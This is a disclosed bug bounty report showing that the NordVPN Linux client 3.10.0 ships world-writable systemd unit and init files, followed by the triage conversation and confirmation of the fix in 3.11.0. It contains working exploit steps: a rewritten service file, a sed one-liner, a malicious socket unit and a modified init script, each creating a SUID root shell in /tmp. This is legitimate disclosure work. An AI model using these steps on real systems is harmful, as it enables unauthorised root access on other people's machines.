title: NordVPN Linux Client - Unsafe service file permissions leads to Local Privilege Escalation

profile.name: Nord Security
profile.about: Digital security and privacy for everyone

vulnerability_information:
The Linux package available in NordVPN's repository is affected by a permission issue in init script and systemd unit files that allows any user on the system to execute arbitrary command as root.

## Tested Version

Tested version is the latest available on the repository, which is `3.10.0` and is available at:

https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn_3.10.0-1_amd64.deb

```
root@debian:/var/cache/apt/archives# sha256sum nordvpn_3.10.0-1_amd64.deb 
04d0089e326542c629c5f50a235de82bf3fa9fa829065be0490a0902e6770b63  nordvpn_3.10.0-1_amd64.deb
```

Test system is debian 10.

Previous versions are also affected.

## Technical Details

The Linux package in the official NordVPN repository ships with the following files:

```
root@debian:~# dpkg -c /var/cache/apt/archives/nordvpn_3.10.0-1_amd64.deb 
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/lib/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/lib/nordvpn/
-rw-rw-rw- 0/0            4973 2021-04-07 10:15 ./var/lib/nordvpn/icon.svg
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./etc/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./etc/init.d/
-rwxrwxrwx 0/0            2442 2021-04-07 10:15 ./etc/init.d/nordvpn
-rwxr-xr-x 0/0         3135944 2021-05-31 11:44 ./var/lib/nordvpn/openvpn
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/systemd/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/systemd/system/
-rw-rw-rw- 0/0             368 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.service
-rw-rw-rw- 0/0             229 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.socket
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/tmpfiles.d/
-rw-rw-rw- 0/0              32 2021-04-07 10:15 ./usr/lib/tmpfiles.d/nordvpn.conf
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/bin/
-rwxr-xr-x 0/0        12274928 2021-05-31 11:45 ./usr/bin/nordvpn
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/sbin/
-rwxr-xr-x 0/0        25503576 2021-05-31 11:45 ./usr/sbin/nordvpnd
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/lib/nordvpn/data/
-rw------- 0/0              67 2021-05-31 11:43 ./var/lib/nordvpn/data/cybersec.dat
-rw------- 0/0             137 2021-05-31 11:43 ./var/lib/nordvpn/data/insights.dat
-rw------- 0/0            3465 2021-05-31 11:43 ./var/lib/nordvpn/data/ovpn_template.xslt
-rw------- 0/0            4109 2021-05-31 11:43 ./var/lib/nordvpn/data/ovpn_xor_template.xslt
-rw------- 0/0             800 2021-05-31 11:43 ./var/lib/nordvpn/data/rsa-key-1.pub
-rw------- 0/0         2924507 2021-05-31 11:43 ./var/lib/nordvpn/data/servers.dat
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/man/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/man/man1/
-rw-r--r-- 0/0            1813 2021-05-31 11:43 ./usr/share/man/man1/nordvpn.1.gz
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/bash-completion/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/bash-completion/completions/
-r--r--r-- 0/0             572 2021-05-31 11:44 ./usr/share/bash-completion/completions/nordvpn
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/functions/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/functions/Completion/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/functions/Completion/Unix/
-r--r--r-- 0/0             488 2021-05-31 11:44 ./usr/share/zsh/functions/Completion/Unix/_nordvpn_auto_complete
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/doc/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/doc/nordvpn/
-rw-r--r-- 0/0            5504 2021-05-31 11:45 ./usr/share/doc/nordvpn/changelog.gz
```

Some of these files are created with unsafe permissions, this allow any user on the system to overwrite them:

```
-rwxrwxrwx 0/0            2442 2021-04-07 10:15 ./etc/init.d/nordvpn
-rw-rw-rw- 0/0             368 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.service
-rw-rw-rw- 0/0             229 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.socket
```

By overwriting these files, an unprivileged user can trigger the init system to execute arbitrary code as UID 0.

## PoC

The original service unit shipped with the package is this:

```
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/sbin/nordvpnd
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
```

An attacker could override the `ExecStart` entry to execute arbitrary code. For example, this line creates a `SUID` bash binary in `/tmp`:

```
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
```


### Step by step exploitation

Commands beginning with `#` need a privileged account, while commands beginning with `$` are executed in the context of the unprivileged attacker.

1. Add NordVPN repo as a privileged user

```
# wget https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb
# dpkg -i nordvpn-release_1.0.0_all.deb
```

2. Install NordVPN client as a privileged user

```
# apt-get update
# apt-get install nordvpn
```

3. Proof there's no suid bash in /tmp

```
$ ls -la /tmp
```

4. Edit systemd service file as an unprivileged user

```
$ cat << EOF > /usr/lib/systemd/system/nordvpnd.service
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
EOF
```

5. Reboot the system to reload and restart the new service (privileged user may not be required if the attacker has physical access to the system)
```
# reboot
```

6. Execute the SUID bash to get root

```
$ ls -l /tmp
$ /tmp/evilbash -p
evilbash-5.0# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),998(nordvpn)
```

## Impact

The attacker can execute arbitrary command as the root user on the system.

activities.message:
Hi @bashketchum,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@saffron

Hi @bashketchum, 

Thank you for the report! I was able to edit the file `/usr/lib/systemd/system/nordvpnd.service` as an attacker with 'Standard' account type, but when I reboot the machine I do not observe the file `/tmp/evilbash` being created, therefore, I wanted to request if you can please indicate if you are still able to reproduce this scenario? and do I need to perform any other steps?

Thank you for your help!

Regards, 
@saffron

Hi @saffron,
first of all, thank you fro your ack.

The attack is still reproducible on Debian 10 (and probably other distros) with the latest version available in the NordVPN's repo.

No other steps should be required after editing `ExecStart` and making sure the service is reloaded and restarted (rebooting).

Could you please check that:
- the `nordvpnd.service` is enabled (default in Debian 10 after install, may require `systemctl enable --now nordvpnd.service` on other distros)
- your `ExecStart` is exactly the same I posted, as systemd is quite  picky about this: it requires a full path to the binary and does not support piping (thus `/usr/bin/bash -c "<COMMANDS>"` is needed to chain multiple commands)

You may also want to check the service status and log after rebooting to spot any error in your unit service file with:
```
# systemctl status nordvpnd.service
# journalctl --unit nordvpnd.service
```

You can also try this oneliner (instead of the `cat << EOF > /usr/lib/systemd/system/nordvpnd.service` command) to edit the service and make sure it matches mine:
```
sed -i 's#^ExecStart=.*$#ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"#g' /usr/lib/systemd/system/nordvpnd.service
```

Also, to speed up the troubleshooting of your exploit, rebooting isn't really needed: you may just reload and restart the service manually
```
systemctl daemon-reload
systemctl restart nordvpnd.service
```

If you still can't reproduce, would you mind sharing your unit file and systemd / journalct logs?

Thank you,
@bashketchum

Hi @bashketchum, 

Thanks for the additional information. I was able to reproduce this scenario leveraging the file `/usr/lib/systemd/system/nordvpnd.service`, since you've indicated two more vulnerable files `./etc/init.d/nordvpn` and `./usr/lib/systemd/system/nordvpnd.socket`, therefore,  I request can you please indicate how shall an attacker use these two files to execute commands?

Thank you for your help!

Regards, 
@saffron

Hi @saffron 
once the attacker can write to systemd's unit files, there are many ways to escalate privileges.

- For `service` files the most straightforward is the one I mentioned previously (editing `ExecStart`).

- `socket` files also have several options for easy code execution, and one of those is  `ExecStartPre`.  The attacker can just add that option in the `socket` unit file and execute arbitrary code as root in the very same way of the `service` unit file.
Here is a potential evil `nordvpnd.socket` sample:

```
[Unit]
Description=NordVPN Daemon Socket
PartOf=nordvpnd.service

[Socket]
ExecStartPre=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash_socket; chmod u+s /tmp/evilbash_socket"
ListenStream=/run/nordvpn/nordvpnd.sock
NoDelay=true
# SocketUser=root
SocketGroup=nordvpn
SocketMode=0770
NoDelay=true

[Install]
WantedBy=sockets.target
```
Here you can clearly see that the malicious line beginning with `ExecStartPre` (not present in the original `socket` file) is basically the same of `ExecStart`  in the malicious `nordvpnd.service` unit file.

- Files located at `/etc/init.d/` are the init scripts for the `sysv` init system, the way to exploit this depends on the inti system of the OS: I will try to explain this in sections below.

## SysV init system
OSs which don't use `systemd` as an init system use those scripts (`/etc/init.d/*`) for starting / stopping system services. On those OSs you can edit the file `/etc/init.d/nordvpn` by hooking one of the functions invoked (I will use `start` in the example below) and that code will execute every time the service is started (e.g. on boot if it is enabled).
Here is the original `start` function:
```
start() {
  create_socket_dir
  # Return
  #   0 if daemon has been started
  #   1 if daemon was already running
  #   2 if daemon could not be started
  start-stop-daemon --start --quiet -g "$NORDVPN_GROUP" --pidfile $PIDFILE --exec $DAEMON \
    --background --make-pidfile --no-close --test > /dev/null || return 1
  start-stop-daemon --start --quiet -g "$NORDVPN_GROUP" --pidfile $PIDFILE --exec $DAEMON \
    --background --make-pidfile --no-close >> $LOGFILE 2>&1 || return 2
    }
```
and this is the modified one:
```
start() {
  cp /usr/bin/bash /tmp/evilbash_init;
  chmod u+x /tmp/evilbash_init;
  create_socket_dir
  # Return
  #   0 if daemon has been started
  #   1 if daemon was already running
  #   2 if daemon could not be started
  start-stop-daemon --start --quiet -g "$NORDVPN_GROUP" --pidfile $PIDFILE --exec $DAEMON \
    --background --make-pidfile --no-close --test > /dev/null || return 1
  start-stop-daemon --start --quiet -g "$NORDVPN_GROUP" --pidfile $PIDFILE --exec $DAEMON \
    --background --make-pidfile --no-close >> $LOGFILE 2>&1 || return 2
  }
```
The first two lines are the very same commands that you can find in `service` and `socket` files.
To exploit this on a SysV init system, just enable the service (if not enabled by default), edit the script and reboot.

## Systemd Init System
OSs that use `systemd` as an init system use those scripts in a slightly different way. When an user with adequate permissions tries to start / enable a service, first some defaults location are searched for actual systemd `service` unit files (see `man systemd.unit` for further details). If the service file is not found, then the relevant script at /etc/init.d is used as an input for the `systemd-sysv-generator` program to generate `service` unit files on the fly.
So in order to exploit this on a OS with systemd you have to:
  - make sure there's no `nordvpn.service` unit file in the default locations (**mind that there's no `d` at the end**, if you type the `d` you will be using the native `service` unit and not the init script)
  - edit the init script (as described in case of `sysv` init system)
  - have an user with enough privileges start the service `nordvpn` (not enabled by default on Debian 10, as it uses the native `service` unit file `nordvpnd.service`)
  So to exploit this on systemd OS just edit the init script as I mentioned above, then as the root user start the service with: `systemctl enable nordvpn` and reboot the system (or start the service manually with `systemctl start nordvpn`).

Hello @bashketchum,

Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Thanks & Regards,
@saffron

Hi @bashketchum 

thanks for the very detailed and insightful report. We will be rewarding you with the bounty and we will let you know once the fix is available.

Hi @nordsecurity,

Thank you for the bounty!
Are you ok with disclosing this report and registering a CVE once this is fixed?

Regards

Hi @bashketchum 

we do not register the CVE for our issues, however, this is something that we are thinking about, but we do not have any ETA for it when this will happen.

Hi @fixed_zero, 
since you're not going to register a CVE, do you mind if I proceed independently with a request to MITRE?

Hi @bashketchum 

want to share some news with you. After internal discussion, it was agreed that it is ok to proceed to register CVE on your own with MITRE. It was also decided that CVE process should be initiated and set in place properly on our side. This will take time, but hopefully, we will succeed. 
Second, the fix should be released within this Q3 if everything goes according to the release plan. We would like to ask you to register CVE only after we will officially release the new version with this fix.

Hi @fixed_zero ,
sure, I will wait for the patched version to be publicly available before registering the CVE: please let me know when it's released.

Hi @bashketchum 

i would like to inform you that we have released recently a new version with the fixes addressing your reported issue. Would you have time to verify if the fix?

Hi @fixed_zero,
I've made a quick check on deb packages hosted at https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/
I can confirm that last release (`nordvpn_3.11.0-1_<ARCH>.deb`) is unaffected.

Old versions are still unpatched: I suggest you fix permissions on older versions too (e.g. releasing `nordvpn_3.10.0-2_<ARCH>.deb` and so on), so that distributions that may be pinning the package version would be able to get the fix without having to do a version upgrade.

I have uploaded a list of affected packages in case you decide to backport the fix.

Hi @bashketchum 

thanks for the suggestion, we will take this into consideration!

Hi @bashketchum 

I'm closing this report as `Resolved`. I have changed the severity to `Medium` because we are changing our internal severity evaluation process. However, this will not have any effect on the already issued bounty reward.
